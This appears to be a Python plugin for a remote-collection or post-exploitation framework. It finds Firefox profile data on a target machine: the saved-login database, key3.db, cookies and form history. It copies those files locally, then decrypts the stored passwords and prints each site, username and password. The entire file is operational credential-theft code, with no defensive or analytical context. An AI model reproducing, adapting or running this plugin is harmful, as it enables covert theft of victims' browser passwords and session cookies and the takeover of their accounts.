
from plugin import plugin

class firefox(plugin, ):

    def __init__(self, os, maxsize):
        plugin.__init__(self, os, maxsize, __name__)
        print ('loaded %s' % __name__)

    def preGet(self):
        lFiles = self.listFiles()
        size = 0
        for f in lFiles:
            size += f.size
        print ('About to get %d files totalling %d bytes. Will prompt for individual files > %d bytes' % (len(lFiles), size, self.getMaxSize()))

    def postGet(self):
        import shutil
        import sys
        import os, os.path
        import dsz.lp
        import ops.env
        from ops.pprint import pprint
        windowsScripts = (dsz.lp.GetResourcesDirectory() + 'Ops\\PyScripts\\windows')
        sys.path.append(windowsScripts)
        from firefox_decrypt import read_passwords_from_profile
        NOSEND = os.path.join(ops.env.get('_LOGPATH'), 'GetFiles', 'NOSEND')
        profiles = []
        if (not os.path.exists(NOSEND)):
            os.makedirs(NOSEND)
        for f in self.listCollectedFiles():
            remoteFullFile = f[0]
            localFullFile = f[1]
            remotePath = str(os.path.split(remoteFullFile)[0])
            remoteFile = str(os.path.split(remoteFullFile)[1])
            localPath = str(os.path.split(localFullFile)[0])
            localFile = str(os.path.split(localFullFile)[1])
            profile = os.path.split(remotePath)[1]
            localProfileDir = os.path.join(NOSEND, profile)
            if (localProfileDir not in profiles):
                profiles.append(str(localProfileDir))
            if (not os.path.exists(localProfileDir)):
                os.makedirs(localProfileDir)
            destFile = os.path.join(localProfileDir, remoteFile)
            shutil.copy(localFullFile, destFile)
        for profile in profiles:
            passwords = read_passwords_from_profile(profile)
            if passwords:
                pprint(passwords, ['Site', 'Username', 'Password'], ['site', 'user', 'pass'])
            else:
                print ('No passwords found in %s' % profile)

    def check(self, path):
        topDir = ''
        if (self.getOS() == 6):
            topDir = ('%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles' % path)
        else:
            topDir = ('%s\\Application Data\\Mozilla\\Firefox\\Profiles' % path)
        findThese = ['cert8.db', 'cookies.sqlite', 'formhistory.sqlite', 'signons.sqlite', 'key3.db', 'firefox.js', 'prefs.js']
        self.find(topDir, findThese)